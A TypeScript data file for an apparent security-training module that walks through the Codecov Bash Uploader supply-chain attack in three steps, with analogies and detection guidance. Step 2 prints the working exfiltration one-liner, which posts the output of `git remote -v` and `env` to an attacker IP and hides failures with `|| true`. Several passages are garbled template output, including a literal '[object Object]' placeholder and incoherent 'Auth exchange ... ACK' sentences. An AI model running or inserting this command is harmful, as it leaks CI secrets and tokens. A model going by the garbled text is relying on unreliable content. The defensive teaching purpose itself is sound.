import type { RawScenarioStepGuideData } from '@/modules/scenarios/contracts';

export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'codecov-bash-uploader-ci-env-exfil',
    briefing: {
      headline:
        'Attackers modify Codecov’s hosted Bash Uploader script (codecov.sh) using a leaked GCS credential to silently POST every CI runner’s environment variables and git remote URLs to an external IP.',
      storyAnalogy:
        'Imagine thousands of companies hiring a courier service by downloading the courier’s instruction sheet every morning and reading it aloud to a voice-activated robot without checking if the sheet changed. One day, a thief adds a single sentence at the bottom of the master instruction sheet: "Also mail a photocopy of every key on your keyring to this P.O. Box."',
      plainSummary:
        'In this scenario (T1195.002, Codecov Bash Uploader CI/CD Environment Variable Exfiltration), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: gCS Bucket Tampering of Hosted codecov.sh, then unverified curl | bash Execution, then downstream Private Git Repository Cloning. Steps #1–#3 walk that chain end-to-end by covering GCS Bucket Tampering of Hosted codecov.sh, then Unverified curl | bash Execution, then Downstream Private Git Repository Cloning, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'Attacker Collector (178.62.86.114) -> Codecov GCS Bucket (codecov.io/bash) -> Enterprise CI Runner (curl | bash) -> Private Git Repos & Cloud Production Keys -> Egress Proxy & SHA-256 Verifier.',
      documentedAdvisory:
        'Codecov Security Advisory (April 2021) / Mandiant Supply Chain Investigation / CISA Alert',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'GCS Bucket Tampering of Hosted codecov.sh Uploader',
        storyAnalogy:
          'A thief finds a spare key left inside an old shipping crate and uses it to unlock the printing room where the daily instruction flyers are stored.',
        simpleExplanation:
          'By extracting a residual Google Cloud Storage (GCS) service account credential from a Codecov Docker image layer, the threat actor gained write access to the GCS bucket hosting https://codecov.io/bash and modified line 522 (injecting a one-line curl exfiltration command while leaving all coverage-reporting functionality intact so customer builds continued passing).',
        howItWorksInPractice:
          'The tampering remained undetected until a security-conscious customer verified the downloaded script against the published SHA-256 checksum in Codecov’s GitHub repository and noticed the hash mismatch. In the documented Auth exchange from Attacker Collector (178.62.86.114) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1195.002 (confirming that the Stage 1: GCS Bucket Tampering of Hosted codecov.sh Uploader request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Unverified curl | bash Execution & CI Environment Harvesting).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Attacker node to the Codecov GCS Bucket (codecov.io/bash) where the hosted script is overwritten.',
        detectionAndEvidence:
          'Enable cloud storage object integrity monitoring and enforce automated CI checksum checks comparing downloaded script SHA-256 hashes against cryptographically signed vendor release manifests (stopping tampered remote scripts before execution). Correlate Sysmon or Windows Security Event telemetry for T1195.002 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1005',
        plainTitle: 'Unverified curl | bash Execution & CI Environment Harvesting',
        storyAnalogy:
          'Every time a factory finishes testing a product, the robot downloads the tampered flyer and immediately reads out every password posted on the factory wall.',
        simpleExplanation:
          'When customer CI pipelines executed bash <(curl -s https://codecov.io/bash) (the curl | bash anti-pattern that streams remote code directly into a live shell interpreter without prior hash verification), the shell evaluated curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true (using a 500-millisecond timeout -m 0.5 and || true so even if the attacker server was unreachable, the CI job would still exit 0 without alerting developers).',
        howItWorksInPractice:
          '$(git remote -v) captured the repository URL (often containing embedded OAuth tokens like https://x-access-token:ghp_...@github.com/...), and $(env) dumped every environment variable exported into the CI runner (AWS_SECRET_ACCESS_KEY, DATABASE_URL, NPM_TOKEN, GPG keys). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Codecov GCS Bucket to the Enterprise CI Runner and out to the Attacker Collector (178.62.86.114) while the Egress Proxy logs the raw IP connection.',
        detectionAndEvidence:
          'Audit CI runner network egress logs for outbound HTTP POST requests to 178.62.86.114 or 104.248.94.23 alongside process telemetry capturing curl invoked with $(env) command substitution (confirming live environment variable exfiltration). Correlate Sysmon or Windows Security Event telemetry for T1005 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1078.004',
        plainTitle: 'Downstream Private Git Repository Cloning & Signing Key Abuse',
        storyAnalogy:
          'Armed with the photocopied master keys from hundreds of companies, the thief walks into their private blueprint vaults at night and copies their crown-jewel designs.',
        simpleExplanation:
          'Using the harvested CI environment variables (GITHUB_TOKEN, personal access tokens, and cloud service credentials), the threat actor systematically authenticated to victim GitHub Enterprise and cloud tenants from external VPS infrastructure (104.248.94.23, cloning private source code repositories to search for hardcoded secrets and customer signing keys).',
        howItWorksInPractice:
          'Several high-profile software vendors had their private repositories cloned or GPG signing keys exposed through the CI environment dump, requiring enterprise-wide secret and certificate rotation. In the documented Auth exchange from Codecov GCS Bucket (codecov.io/bash) to Enterprise CI Runner (curl | bash), Enterprise CI Runner (curl | bash) responds with ACK T1078.004 (confirming that the Stage 3: Downstream Private Git Repository Cloning & Signing Key Abuse request succeeded on Enterprise CI Runner (curl | bash) and completing the final execution objective of Codecov Bash Uploader CI/CD Environment Variable Exfiltration).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the Attacker Collector pivoting with stolen CI credentials into Private Git Repos & Cloud Production Keys.',
        detectionAndEvidence:
          'Inspect GitHub Audit Log git.clone and API token usage events originating from IP ranges outside authorized CI/CD runner pools using machine or bot account tokens (revealing post-exfiltration repository theft). Correlate Sysmon or Windows Security Event telemetry for T1078.004 (pairing parent/child process and destination fields) and contain the offending session.',
      },
    ],
  };
